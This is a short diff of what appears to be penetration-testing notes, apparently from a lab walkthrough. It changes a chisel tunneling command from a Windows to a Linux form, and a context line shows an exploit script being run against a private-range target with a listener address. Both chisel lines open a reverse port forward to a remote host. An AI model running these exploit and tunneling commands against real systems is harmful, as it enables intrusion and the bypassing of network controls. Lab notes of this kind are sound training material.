@@ -45,7 +45,7 @@ python3 exploit.py -t 192.168.162.150 -p 8080 -u /search -param query -L 192.168
 ```
 
 ```
-start /b chisel.exe client 192.168.45.178:9999 R:8080:127.0.0.1:8080
+./chisel client 192.168.45.178:9999 R:8080:127.0.0.1:8080
 ```
 
 ```
